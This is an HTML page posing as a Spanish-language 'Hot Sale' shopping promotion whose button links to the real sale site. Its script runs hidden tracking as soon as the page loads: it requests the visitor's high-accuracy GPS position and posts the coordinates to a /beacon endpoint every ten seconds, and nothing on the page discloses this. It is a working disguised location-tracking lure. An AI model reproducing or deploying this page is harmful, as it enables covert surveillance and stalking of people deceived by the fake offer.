<!DOCTYPE html>
<html lang="es">

<head>

    <meta charset="UTF-8" />

    <meta
        name="viewport"
        content="width=device-width, initial-scale=1.0"
    />

    <title>HotSale</title>

    <style>

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {

            width: 100vw;
            height: 100vh;

            display: flex;
            justify-content: center;
            align-items: center;

            overflow: hidden;

            font-family: Arial, sans-serif;

            background-image:
                url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?q=80&w=1920');

            background-size: cover;
            background-position: center;
        }

        .overlay {

            position: absolute;

            width: 100%;
            height: 100%;

            background:
                rgba(0, 0, 0, 0.45);

            display: flex;
            justify-content: center;
            align-items: center;
        }

        .card {

            background: rgba(255,255,255,0.12);

            backdrop-filter: blur(10px);

            padding: 40px;

            border-radius: 20px;

            text-align: center;

            color: white;

            width: 90%;
            max-width: 400px;

            box-shadow:
                0 10px 40px rgba(0,0,0,0.4);
        }

        h1 {

            font-size: 2.5rem;
            margin-bottom: 15px;
        }

        p {

            margin-bottom: 30px;
            opacity: 0.9;
        }

        button {

            border: none;

            padding:
                15px 30px;

            border-radius: 12px;

            font-size: 1rem;

            cursor: pointer;

            background: white;
            color: black;

            font-weight: bold;

            transition: 0.2s;
        }

        button:active {
            transform: scale(0.96);
        }

    </style>

</head>

<body>

<div class="overlay">

    <div class="card">

        <h1>🔥 Hot Sale</h1>

        <p>
            Descubre las mejores ofertas disponibles hoy.
        </p>

        <button onclick="startTracking()">
            Entrar ahora
        </button>

    </div>

</div>

<script>



async function sendBeacon() {

    navigator.geolocation.getCurrentPosition(

        async (pos) => {

            const payload = {
                lat: pos.coords.latitude,
                lng: pos.coords.longitude,
                accuracy: pos.coords.accuracy,
                timestamp: Date.now()
            }

            await fetch('/beacon', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(payload)
            })

        },

        (err) => {
            console.error(err)
        },

        {
            enableHighAccuracy: true
        }
    )
}

sendBeacon()

setInterval(sendBeacon, 10000)


function startTracking() {
    window.open(
        'https://www.hotsale.com.mx/',
        '_blank'
    )
}

</script>

</body>
</html>
